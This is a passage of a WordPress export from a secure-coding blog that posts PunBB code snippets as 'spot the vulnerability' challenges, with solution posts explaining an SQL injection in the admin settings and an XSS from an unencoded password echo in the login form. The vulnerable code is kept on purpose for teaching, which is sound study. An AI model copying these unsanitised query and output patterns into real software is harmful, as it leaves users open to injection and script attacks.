		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/ftbcJW]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[70975e2b77efbd78ab79cf0b60858e1a]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1363</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention New Post: Tougher #secure #code #dev -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2010/12/tougher/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2010-12-28 23:24:45</wp:comment_date>
			<wp:comment_date_gmt>2010-12-29 06:24:45</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by William Clark, Spot The Vuln. Spot The Vuln said: New Post: Tougher http://bit.ly/gynwNA #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293603885.5849";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293786792.0789";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1371</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, PunBB, SQL Injection, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/12/tougher-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-12-31 02:12:11</wp:comment_date>
			<wp:comment_date_gmt>2010-12-31 09:12:11</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Tougher [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1293786797.432";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1293786731.6712";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Tougher - SQL Injection</title>
		<link>http://spotthevuln.com/2010/12/tougher-sql-injection/</link>
		<pubDate>Fri, 31 Dec 2010 09:12:07 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1267</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: PunBB

Fixed in Version: 1.3

Issue Type: SQL Injection (SQLi)

Original Code: <a title="Tougher" href="http://spotthevuln.com/2010/12/tougher/" target="_blank">Found    Here</a>
<h3>Description</h3>
This week’s bug was an old SQL injection bug that affected PunBB versions &lt; 1.3.  In short, a value is taken from an attacker/user controlled POST request and is used to build a SQL statement.  This bug actually requires a small amount of tracing, so here we go!  First, we see that PunBB takes the attacker/user supplied content here (line 11)
<br><br>
[sourcecode language="diff" highlight="11,19,26,27" firstline="11"]$form = array_map('trim', $_POST['form']);[/sourcecode]
<br><br>
The line above uses the value passed via $_POST[‘form’] to populate the $form variable.  The value goes through a trim() function, but is (for the most part) un-sanitized.  It’s interesting that PHP allows for the submission of arrays through POST parameters.  This behavior is mentioned in the comments on this <a title="Arrays" href="http://php.net/manual/en/reserved.variables.post.php" target="_blank">page</a>

Next, the $form variable (which contains our attacker supplied values from $_POST[‘form’]) is used in a foreach statement and each index of the $form variable value is used in some application logic.   You can see this in the following line (line 19)
<br><br>
[sourcecode language="diff" highlight="11,19,26,27" firstline="19"]foreach ($form as $key =&gt; $input)[/sourcecode]
<br><br>
The foreach extracts the various values from the $form variable, does a quick comparison to a configuration value of some sort.  If the comparison returns the correct value, the application uses the tainted value to populate a $query array variable.  The tainted value is used here (line 26)
<br><br>
[sourcecode language="diff" highlight="11,19,26,27" firstline="26"]'SET'		=&gt; 'conf_value='.$input,[/sourcecode]
<br><br>
The name of the variable ($query), along with the names of the indexes in the array (UPDATE, SET, WHERE), and finally the names of variables/functions close-by ($forum_db, query_build) are dead giveaways that the untainted value will eventually be used in a SQL query.  Use of a tainted value in this manner leads to SQL injection.
The developers addressed this issue by casting the tainted $input value to an int before using it to build a SQL statement.

<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="11,19,26,27"]
...&lt;snip&gt;...

// Load the admin.php language file
require FORUM_ROOT.'lang/'.$forum_user['language'].'/admin_common.php';
require FORUM_ROOT.'lang/'.$forum_user['language'].'/admin_settings.php';

$section = isset($_GET['section']) ? $_GET['section'] : null;

if (isset($_POST['form_sent']))
{
	$form = array_map('trim', $_POST['form']);

	($hook = get_hook('aop_form_submitted')) ? eval($hook) : null;

...&lt;snip&gt;...

	($hook = get_hook('aop_pre_update_configuration')) ? eval($hook) : null;

	foreach ($form as $key =&gt; $input)
	{
		// Only update permission values that have changed
		if (array_key_exists('p_'.$key, $forum_config) &amp;&amp; $forum_config['p_'.$key] != $input)
		{
			$query = array(
				'UPDATE'	=&gt; 'config',
-				'SET'		=&gt; 'conf_value='.$input,
+				'SET'       =&gt; 'conf_value='.intval($input),
				'WHERE'		=&gt; 'conf_name=\'p_'.$forum_db-&gt;escape($key).'\''
			);

			($hook = get_hook('aop_qr_update_permission_conf')) ? eval($hook) : null;
			$forum_db-&gt;query_build($query) or error(__FILE__, __LINE__);
		}

		// Only update option values that have changed
		if (array_key_exists('o_'.$key, $forum_config) &amp;&amp; $forum_config['o_'.$key] != $input)
		{
			if ($input != '' || is_int($input))
				$value = '\''.$forum_db-&gt;escape($input).'\'';
			else
				$value = 'NULL';

			$query = array(
				'UPDATE'	=&gt; 'config',
				'SET'		=&gt; 'conf_value='.$value,
				'WHERE'		=&gt; 'conf_name=\'o_'.$forum_db-&gt;escape($key).'\''
			);

			($hook = get_hook('aop_qr_update_permission_option')) ? eval($hook) : null;
			$forum_db-&gt;query_build($query) or error(__FILE__, __LINE__);
		}
	}

	// Regenerate the config cache
	if (!defined('FORUM_CACHE_FUNCTIONS_LOADED'))
		require FORUM_ROOT.'include/cache.php';

	generate_config_cache();

	($hook = get_hook('aop_pre_redirect')) ? eval($hook) : null;

	redirect(forum_link($forum_url['admin_settings_'.$section]), $lang_admin_settings['Settings updated'].' '.$lang_admin_common['Redirect']);
}

if (!$section || $section == 'setup')
{
	// Setup the form
	$forum_page['group_count'] = $forum_page['item_count'] = $forum_page['fld_count'] = 0;

	// Setup breadcrumbs
	$forum_page['crumbs'] = array(
		array($forum_config['o_board_title'], forum_link($forum_url['index'])),
		array($lang_admin_common['Forum administration'], forum_link($forum_url['admin_index'])),
		array($lang_admin_common['Settings'], forum_link($forum_url['admin_settings_setup'])),
		array($lang_admin_common['Setup'], forum_link($forum_url['admin_settings_setup']))
	);

	($hook = get_hook('aop_setup_pre_header_load')) ? eval($hook) : null;

	define('FORUM_PAGE_SECTION', 'settings');
	define('FORUM_PAGE', 'admin-settings-setup');
	require FORUM_ROOT.'header.php';

	// START SUBST - &lt;!-- forum_main --&gt;
	ob_start();

	($hook = get_hook('aop_setup_output_start')) ? eval($hook) : null;

?&gt;
	&lt;div class=&quot;main-content main-frm&quot;&gt;
		&lt;form class=&quot;frm-form&quot; method=&quot;post&quot; accept-charset=&quot;utf-8&quot; action=&quot;&lt;?php echo forum_link($forum_url['admin_settings_setup']) ?&gt;&quot;&gt;
			&lt;div class=&quot;hidden&quot;&gt;
				&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?php echo generate_form_token(forum_link($forum_url['admin_settings_setup'])) ?&gt;&quot; /&gt;
				&lt;input type=&quot;hidden&quot; name=&quot;form_sent&quot; value=&quot;1&quot; /&gt;
			&lt;/div&gt;
				&lt;div class=&quot;content-head&quot;&gt;
					&lt;h2 class=&quot;hn&quot;&gt;&lt;span&gt;&lt;?php echo $lang_admin_settings['Setup personal'] ?&gt;&lt;/span&gt;&lt;/h2&gt;
				&lt;/div&gt;

...&lt;snip&gt;...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1267</wp:post_id>
		<wp:post_date>2010-12-31 02:12:07</wp:post_date>
		<wp:post_date_gmt>2010-12-31 09:12:07</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>tougher-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="array"><![CDATA[array]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="post_tag" nicename="injection-bug"><![CDATA[injection bug]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="punbb"><![CDATA[PunBB]]></category>
		<category domain="post_tag" nicename="punbb-2"><![CDATA[punbb]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-statement"><![CDATA[sql statement]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/hUDV7Q]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[3e788b730e85a0057b3c91b7116897bb]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Banks</title>
		<link>http://spotthevuln.com/2011/01/banks/</link>
		<pubDate>Mon, 03 Jan 2011 12:00:27 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1270</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I have always been afraid of banks.</strong> <br><strong> - Andrew Jackson
</strong></blockquote>
[sourcecode language="php"]
...snip...
&lt;?php

	($hook = get_hook('li_forgot_pass_end')) ? eval($hook) : null;

	$tpl_temp = forum_trim(ob_get_contents());
	$tpl_main = str_replace('&lt;!-- forum_main --&gt;', $tpl_temp, $tpl_main);
	ob_end_clean();
	// END SUBST - &lt;!-- forum_main --&gt;

	require FORUM_ROOT.'footer.php';
}

if (!$forum_user['is_guest'])
	header('Location: '.forum_link($forum_url['index']));

// Setup form
$forum_page['group_count'] = $forum_page['item_count'] = $forum_page['fld_count'] = 0;
$forum_page['form_action'] = forum_link($forum_url['login']);

$forum_page['hidden_fields'] = array(
	'form_sent'		=&gt; '&lt;input type=&quot;hidden&quot; name=&quot;form_sent&quot; value=&quot;1&quot; /&gt;',
	'redirect_url'	=&gt; '&lt;input type=&quot;hidden&quot; name=&quot;redirect_url&quot; value=&quot;'.forum_htmlencode($forum_user['prev_url']).'&quot; /&gt;',
	'csrf_token'	=&gt; '&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;'.generate_form_token($forum_page['form_action']).'&quot; /&gt;'
);

// Setup breadcrumbs
$forum_page['crumbs'] = array(
	array($forum_config['o_board_title'], forum_link($forum_url['index'])),
	array(sprintf($lang_login['Login info'], $forum_config['o_board_title']), forum_link($forum_url['login']))
);

($hook = get_hook('li_login_pre_header_load')) ? eval($hook) : null;

define('FORUM_PAGE', 'login');
require FORUM_ROOT.'header.php';

// START SUBST - &lt;!-- forum_main --&gt;
ob_start();

($hook = get_hook('li_login_output_start')) ? eval($hook) : null;

?&gt;
	&lt;div class=&quot;main-head&quot;&gt;
		&lt;h2 class=&quot;hn&quot;&gt;&lt;span&gt;&lt;?php echo sprintf($lang_login['Login info'], $forum_config['o_board_title']) ?&gt;&lt;/span&gt;&lt;/h2&gt;
	&lt;/div&gt;
	&lt;div class=&quot;main-content main-frm&quot;&gt;
		&lt;div class=&quot;content-head&quot;&gt;
			&lt;p class=&quot;hn&quot;&gt;&lt;?php printf($lang_login['Login options'], '&lt;a href=&quot;'.forum_link($forum_url['register']).'&quot;&gt;'.$lang_login['register'].'&lt;/a&gt;', '&lt;a href=&quot;'.forum_link($forum_url['request_password']).'&quot;&gt;'.$lang_login['Obtain pass'].'&lt;/a&gt;') ?&gt;&lt;/p&gt;
		&lt;/div&gt;
&lt;?php

	// If there were any errors, show them
	if (!empty($errors))
	{
		$forum_page['errors'] = array();
	foreach ($errors as $cur_error)
			$forum_page['errors'][] = '&lt;li class=&quot;warn&quot;&gt;&lt;span&gt;'.$cur_error.'&lt;/span&gt;&lt;/li&gt;';

		($hook = get_hook('li_pre_login_errors')) ? eval($hook) : null;

?&gt;
		&lt;div class=&quot;ct-box error-box&quot;&gt;
			&lt;h2 class=&quot;warn hn&quot;&gt;&lt;?php echo $lang_login['Login errors'] ?&gt;&lt;/h2&gt;
			&lt;ul class=&quot;error-list&quot;&gt;
				&lt;?php echo implode(&quot;\n\t\t\t\t&quot;, $forum_page['errors']).&quot;\n&quot; ?&gt;
			&lt;/ul&gt;
		&lt;/div&gt;
&lt;?php

	}

?&gt;
		&lt;div id=&quot;req-msg&quot; class=&quot;req-warn ct-box error-box&quot;&gt;
			&lt;p class=&quot;important&quot;&gt;&lt;?php printf($lang_common['Required warn'], '&lt;em&gt;'.$lang_common['Required'].'&lt;/em&gt;') ?&gt;&lt;/p&gt;
		&lt;/div&gt;
		&lt;form id=&quot;afocus&quot; class=&quot;frm-form&quot; method=&quot;post&quot; accept-charset=&quot;utf-8&quot; action=&quot;&lt;?php echo $forum_page['form_action'] ?&gt;&quot;&gt;
			&lt;div class=&quot;hidden&quot;&gt;
				&lt;?php echo implode(&quot;\n\t\t\t\t&quot;, $forum_page['hidden_fields']).&quot;\n&quot; ?&gt;
			&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_login_group')) ? eval($hook) : null; ?&gt;
			&lt;div class=&quot;frm-group group&lt;?php echo ++$forum_page['group_count'] ?&gt;&quot;&gt;
&lt;?php ($hook = get_hook('li_login_pre_username')) ? eval($hook) : null; ?&gt;
				&lt;div class=&quot;sf-set set&lt;?php echo ++$forum_page['item_count'] ?&gt;&quot;&gt;
					&lt;div class=&quot;sf-box text required&quot;&gt;
						&lt;label for=&quot;fld&lt;?php echo ++$forum_page['fld_count'] ?&gt;&quot;&gt;&lt;span&gt;&lt;?php echo $lang_login['Username'] ?&gt; &lt;em&gt;&lt;?php echo $lang_common['Required'] ?&gt;&lt;/em&gt;&lt;/span&gt;&lt;/label&gt;&lt;br /&gt;
						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot; name=&quot;req_username&quot; value=&quot;&lt;?php echo isset($_POST['req_username']) ? forum_htmlencode($_POST['req_username']) : '' ?&gt;&quot; size=&quot;35&quot; maxlength=&quot;25&quot; /&gt;&lt;/span&gt;
					&lt;/div&gt;
				&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_pass')) ? eval($hook) : null; ?&gt;
				&lt;div class=&quot;sf-set set&lt;?php echo ++$forum_page['item_count'] ?&gt;&quot;&gt;
					&lt;div class=&quot;sf-box text required&quot;&gt;
						&lt;label for=&quot;fld&lt;?php echo ++$forum_page['fld_count'] ?&gt;&quot;&gt;&lt;span&gt;&lt;?php echo $lang_login['Password'] ?&gt; &lt;em&gt;&lt;?php echo $lang_common['Required'] ?&gt;&lt;/em&gt;&lt;/span&gt;&lt;/label&gt;&lt;br /&gt;
						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;password&quot; id=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot; name=&quot;req_password&quot; value=&quot;&lt;?php echo isset($_POST['req_password']) ? ($_POST['req_password']) : '' ?&gt;&quot; size=&quot;35&quot; /&gt;&lt;/span&gt;
					&lt;/div&gt;
				&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_remember_me_checkbox')) ? eval($hook) : null; ?&gt;
				&lt;div class=&quot;sf-set set&lt;?php echo ++$forum_page['item_count'] ?&gt;&quot;&gt;
					&lt;div class=&quot;sf-box checkbox&quot;&gt;
						&lt;span class=&quot;fld-input&quot;&gt;&lt;input type=&quot;checkbox&quot; id=&quot;fld&lt;?php echo ++$forum_page['fld_count'] ?&gt;&quot; name=&quot;save_pass&quot; value=&quot;1&quot; /&gt;&lt;/span&gt;
						&lt;label for=&quot;fld&lt;?php echo $forum_page['fld_count'] ?&gt;&quot;&gt;&lt;span&gt;&lt;?php echo $lang_login['Remember me'] ?&gt;&lt;/span&gt; &lt;?php echo $lang_login['Persistent login'] ?&gt;&lt;/label&gt;
					&lt;/div&gt;
				&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_pre_group_end')) ? eval($hook) : null; ?&gt;
			&lt;/div&gt;
&lt;?php ($hook = get_hook('li_login_group_end')) ? eval($hook) : null; ?&gt;
			&lt;div class=&quot;frm-buttons&quot;&gt;
				&lt;span class=&quot;submit&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;&lt;?php echo $lang_login['Login'] ?&gt;&quot; /&gt;&lt;/span&gt;
			&lt;/div&gt;
		&lt;/form&gt;
	&lt;/div&gt;
&lt;?php

($hook = get_hook('li_end')) ? eval($hook) : null;

$tpl_temp = forum_trim(ob_get_contents());
$tpl_main = str_replace('&lt;!-- forum_main --&gt;', $tpl_temp, $tpl_main);
ob_end_clean();
// END SUBST - &lt;!-- forum_main --&gt;

require FORUM_ROOT.'footer.php';
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1270</wp:post_id>
		<wp:post_date>2011-01-03 05:00:27</wp:post_date>
		<wp:post_date_gmt>2011-01-03 12:00:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>banks</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fz3X9b]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2cc28862437ba99d3e1f9ebbecfb8077]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1667</wp:comment_id>
			<wp:comment_author><![CDATA[unixfreaxjp]]></wp:comment_author>
			<wp:comment_author_email>unixfreaxjp22@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://0day.jp</wp:comment_author_url>
			<wp:comment_author_IP>218.41.100.247</wp:comment_author_IP>
			<wp:comment_date>2011-02-21 09:30:50</wp:comment_date>
			<wp:comment_date_gmt>2011-02-21 16:30:50</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Sir, you sure it's one vulnerability? 
possibly 2(two) answers for me. 
1) XSS at the "login_pre_remember_me_checkbox", checked logic.
2) no maxlength for password? cause XSS in old ver PHP..]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298612274.0846";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1298305850.2003";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1386</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example ~SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/01/banks/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-01-03 05:28:24</wp:comment_date>
			<wp:comment_date_gmt>2011-01-03 12:28:24</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by Spot The Vuln. Spot The Vuln said: New Post: Banks http://bit.ly/fz3X9b #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1294057704.7968";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1294392045.5567";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Banks - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/01/banks-cross-site-scripting/</link>
		<pubDate>Fri, 07 Jan 2011 09:24:01 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1273</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: PunBB

Fixed in Version: 1.3

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Banks" href="http://spotthevuln.com/2011/01/banks/" target="_blank">Found    Here</a>
<h3>Description</h3>
Passwords, passwords, passwords.  For some reason, developers sometimes assume passwords values are safe and do not need encoding.  In this example, the developers chose to encode username values (line 87) however, they assumed password values would be safe.  The incorrect assumption lead to an XSS vulnerability.  In line 94 we see that the developers chose to echo a user supplied password value in the HTML markup without encoding.  HTML rendered by the browser doesn’t distinguish between parameters that are supposed to be passwords or other random values, resulting in XSS.  The developers wisely chose to HTML encode the password value before using the value in HTML markup.   When writing password values to the database, passwords should be hashed before inserted into a database.  Hashing passwords before writing them into a database prevents most injection attacks (if the hashing algorithm consists of only alphanumeric characters) and also helps prevent disclosure if the database is compromised.  Password values should also not be displayed in cleartext in HTML… 

<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="94,95"]
...snip...
&lt;?php

	($hook = get_hook('li_forgot_pass_end')) ? eval($hook) : null;

	$tpl_temp = forum_trim(ob_get_contents());
	$tpl_main = str_replace('&lt;!-- forum_main --&gt;', $tpl_temp, $tpl_main);
	ob_end_clean();
	// END SUBST - &lt;!-- forum_main --&gt;

	require FORUM_ROOT.'footer.php';
}

if (!$forum_user['is_guest'])
	header('Location: '.forum_link($forum_url['index']));

// Setup form
$forum_page['group_count'] = $forum_page['item_count'] = $forum_page['fld_count'] = 0;
$forum_page['form_action'] = forum_link($forum_url['login']);

$forum_page['hidden_fields'] = array(
	'form_sent'		=&gt; '&lt;input type=&quot;hidden&quot; name=&quot;form_sent&quot; value=&quot;1&quot; /&gt;',
	'redirect_url'	=&gt; '&lt;input type=&quot;hidden&quot; name=&quot;redirect_url&quot; value=&quot;'.forum_htmlencode($forum_user['prev_url']).'&quot; /&gt;',
	'csrf_token'	=&gt; '&lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;'.generate_form_token($forum_page['form_action']).'&quot; /&gt;'
);

// Setup breadcrumbs
$forum_page['crumbs'] = array(
	array($forum_config['o_board_title'], forum_link($forum_url['index'])),
	array(sprintf($lang_login['Login info'], $forum_config['o_board_title']), forum_link($forum_url['login']))
);

($hook = get_hook('li_login_pre_header_load')) ? eval($hook) : null;

